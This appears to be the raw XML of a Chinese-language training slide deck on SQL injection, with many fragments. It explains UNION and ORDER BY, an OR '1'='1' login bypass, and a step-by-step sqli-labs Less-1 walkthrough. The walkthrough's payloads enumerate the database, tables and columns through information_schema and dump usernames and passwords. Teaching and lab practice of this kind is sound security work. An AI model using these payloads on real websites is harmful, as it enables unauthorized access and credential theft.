              </a:rPr>
              <a:t>union select * from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t> j9nzvzn56w where </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>tryy=0;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29005" y="11969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.\mysql -uroot -proot -h 127.0.0.1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165888" y="578792"/>
            <a:ext cx="398943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如何查询数据库的数据？</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2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890" y="1163955"/>
            <a:ext cx="2438400" cy="434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565" y="1471930"/>
            <a:ext cx="2583180" cy="124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ym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>合并查询union</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t> 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4464" y="1611254"/>
            <a:ext cx="7670307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合并查询union</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> 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 表名 where xx=xx union select * from 表名 where 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=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;</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US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 j9nzvzn56w where id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>=1 union select </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>* from 表名 where </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>tryy=0;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特性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sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>（前面查询的语句与后面的语句结果互不干扰）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* from  j9nzvzn56w where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id=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chemeClr val="accent4"/>
                </a:solidFill>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>union</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t> select * from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t> j9nzvzn56w where </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>tryy=0;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特性</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>：前面的查询语句的字段数量和后面的查询语句字段数量要一致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select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id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t> from  j9nzvzn56w where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id=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chemeClr val="accent4"/>
                </a:solidFill>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>union</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent4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select * </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>from  j9nzvzn56w where tryy=0;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>                 //</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>查询字段</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>不一样</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US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select </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t> from  j9nzvzn56w where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id=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chemeClr val="accent4"/>
                </a:solidFill>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>union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dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>select </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>tryy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t> from  j9nzvzn56w where tryy=0;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>                  //</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>查询字段一样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0" y="1120140"/>
            <a:ext cx="836676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758" y="521642"/>
            <a:ext cx="39894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order by</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN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1320208" y="1993410"/>
            <a:ext cx="5678128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本意：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>order by </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>表示排序</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>sql</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>注入：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0"/>
              <a:t>order by</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>用来猜表的列数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知道表有多少列</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN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ea"/>
              </a:rPr>
              <a:t>select </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t> from  j9nzvzn56w </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>order by 1;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty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select </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t> from  j9nzvzn56w </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>order by 5;</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p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1590" y="1359535"/>
            <a:ext cx="3360420" cy="3512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5803" y="479732"/>
            <a:ext cx="39894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Sql</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>注入：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866775" y="128206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正常查询</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>当用户登录网站时，通常会输入用户名和密码。以下是一段正常的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> SQL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>查询代码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2294890"/>
            <a:ext cx="1001268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66775" y="31318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注入</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>攻击：如果攻击者输入：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3533775"/>
            <a:ext cx="2970530" cy="97345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66775" y="46818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SQL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>查询变成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" y="5224780"/>
            <a:ext cx="7713980" cy="6286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587365" y="3768725"/>
            <a:ext cx="4457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“--” </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1"/>
              <a:t>是什么意思？为什么这样能绕过身份验证实现了</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1"/>
              <a:t>注入？</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" alt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5803" y="479732"/>
            <a:ext cx="39894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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t> SQL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>注入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866775" y="128206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1.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>基础型</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> SQL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>注入</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>直接将恶意</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> SQL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>代码嵌入用户输入中，并影响查询逻辑。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960" y="2023110"/>
            <a:ext cx="3715385" cy="930910"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="99" name="箭头: 虚尾 98"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16200000">
            <a:off x="7198995" y="2935605"/>
            <a:ext cx="500380" cy="433070"/>
          </a:xfrm>
          <a:prstGeom prst="stripedRightArrow">
            <a:avLst/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6775" y="30340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执行的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> SQL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>查询</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>: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493135"/>
            <a:ext cx="9456420" cy="5295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63005" y="21577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OR'1='1' </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>总为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> true</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>，可以绕过验证。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033780" y="4143375"/>
            <a:ext cx="6780530" cy="48006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1320"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="0" i="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>AND</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="0" i="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>的优先级高于</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="0" i="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="0" i="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>，所以实际执行的条件等价于：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" b="0" i="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33780" y="4546600"/>
            <a:ext cx="7657465" cy="260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0"/>
              <a:t>WHERE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" b="0"/>
              <a:t>(username ='admin')</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" b="0"/>
              <a:t>OR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" b="1"/>
              <a:t>(('1'='1')AND(password ='anything')</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" b="1">
              <a:solidFill>
                <a:srgbClr val="E3EAF2"/>
              </a:solidFill>
              <a:latin typeface="Menlo"/>
              <a:ea typeface="Menlo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33780" y="4935220"/>
            <a:ext cx="7657465" cy="260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0"/>
              <a:t>WHERE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" b="0"/>
              <a:t>(username ='admin')</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" b="0"/>
              <a:t>OR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" b="1"/>
              <a:t>(password ='anything')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" b="1">
              <a:solidFill>
                <a:srgbClr val="E3EAF2"/>
              </a:solidFill>
              <a:latin typeface="Menlo"/>
              <a:ea typeface="Menlo"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="箭头: 虚尾 98"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2141220" y="5484495"/>
            <a:ext cx="1295400" cy="433070"/>
          </a:xfrm>
          <a:prstGeom prst="stripedRightArrow">
            <a:avLst/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075430" y="5247005"/>
            <a:ext cx="7657465" cy="937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/>
              <a:t>如果数据库中存在用户名为 admin 的记录，那么第一个子条件 username</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/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/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/>
              <a:t> = 'admin' 为真，整个WHERE条件即为真，查询就会返回该用户记录，而</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600"/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/>
          </a:p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/>
              <a:t>完全忽略密码检查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5803" y="541962"/>
            <a:ext cx="398943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例题：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>sqli-labs--less1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655" y="1120775"/>
            <a:ext cx="7576185" cy="27031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5640" y="5286375"/>
            <a:ext cx="95345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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>id=1 /  id=2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>均能查询到数据</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>   </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>输入</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>id=1’ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>报错</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US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875" y="2605405"/>
            <a:ext cx="8373110" cy="2470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hackbar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649718" y="4997573"/>
            <a:ext cx="752661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  <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>?id=1’ --+ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>不报错</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>》单引号</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>闭合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因为输入之后后台的语句可能是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> ----------</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>》</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>说明是单引号闭合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255" y="1615440"/>
            <a:ext cx="7452995" cy="2886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0538" y="1247263"/>
            <a:ext cx="752661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如何判断存在注入？（如何引起报错得到后台预设的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>sql</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>语句？）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15" y="4882515"/>
            <a:ext cx="5848985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hackbar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11530" y="4502150"/>
            <a:ext cx="10281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尝试会发现</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>1-3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>都可以正常查询，到</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>4</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>报错</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>》</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>说明一共有</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0"/>
              <a:t>3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0"/>
              <a:t>列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60538" y="1247263"/>
            <a:ext cx="75266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第二步：手工查询有多少列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order by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060" y="1855470"/>
            <a:ext cx="7129145" cy="2406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hackbar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955675" y="1615440"/>
            <a:ext cx="10281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dirty="0"/>
              <a:t>union</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>前面的语句为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>false</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>，才会执行后面语句，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>从而发现哪些位置是可以显示的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60538" y="1247263"/>
            <a:ext cx="75266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zh-CN" altLang="en-US" dirty="0"/>
              <a:t>三步：显示报错位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82675" y="2087880"/>
            <a:ext cx="10281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?id=-1’ union select 1,2,3 --+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75" y="2656840"/>
            <a:ext cx="7346950" cy="3098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hackbar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955675" y="1615440"/>
            <a:ext cx="10281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?id=-1' union select 1,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>database()</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>,3 --+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860538" y="1247263"/>
            <a:ext cx="75266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第四步：爆破</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>库名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1981200"/>
            <a:ext cx="6348095" cy="2352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60425" y="4497070"/>
            <a:ext cx="551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库名为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>security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955675" y="4865370"/>
            <a:ext cx="9738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第五步：爆破表名（一次性爆破出所有的表名，当然也可以用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>limit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>来慢慢</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>爆）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111885" y="5233670"/>
            <a:ext cx="72751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?id=-1' union select 1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>,group_concat(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>table_name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  <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>,3 from information_schema.tables where table_schema='security' --+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95" y="2681605"/>
            <a:ext cx="3838575" cy="11182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hackbar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955675" y="1615440"/>
            <a:ext cx="10281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?id=-1' union select 1,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>group_concat(column_name)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>,3 from information_schema.columns where </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0"/>
              <a:t>table_schema='security' and table_name='users' --+</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN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60538" y="1247263"/>
            <a:ext cx="75266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第六步：爆破列名（爆破全部列</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>名）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955675" y="4064000"/>
            <a:ext cx="9738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第七步：爆破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43305" y="4490085"/>
            <a:ext cx="89782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?id=-1' union select 1,group_concat(username,password),3 from users --+</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>?id=-1' union select 1,group_concat(username,0x3a,password,0x3C,0x68,0x72,0x2F,0x3E),3 from users</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> --+      //</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>让数据美观</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>显示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7498"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="715645" y="2414905"/>
            <a:ext cx="3476625" cy="14573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25" y="2511425"/>
            <a:ext cx="3830955" cy="14947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745" y="1971040"/>
            <a:ext cx="1822450" cy="40976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718" y="515703"/>
            <a:ext cx="7300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hackbar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649718" y="1846555"/>
            <a:ext cx="100034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判断字段数？</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>?id=0'group by 1 --+</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>判断库名？</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>?id=0'union select 1,2,database() --+</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>判断表名？</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>id=0'union select 1,2,group_concat(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>table_name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>) from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>information_schema.tables</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> where </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>table_schema</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>='security'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>判断字段名？</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>?id=0'union select 1,2,group_concat(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>column_name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>) from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>information_schema.columns</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> where </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>table_name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>='users'--+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6250" y="1120140"/>
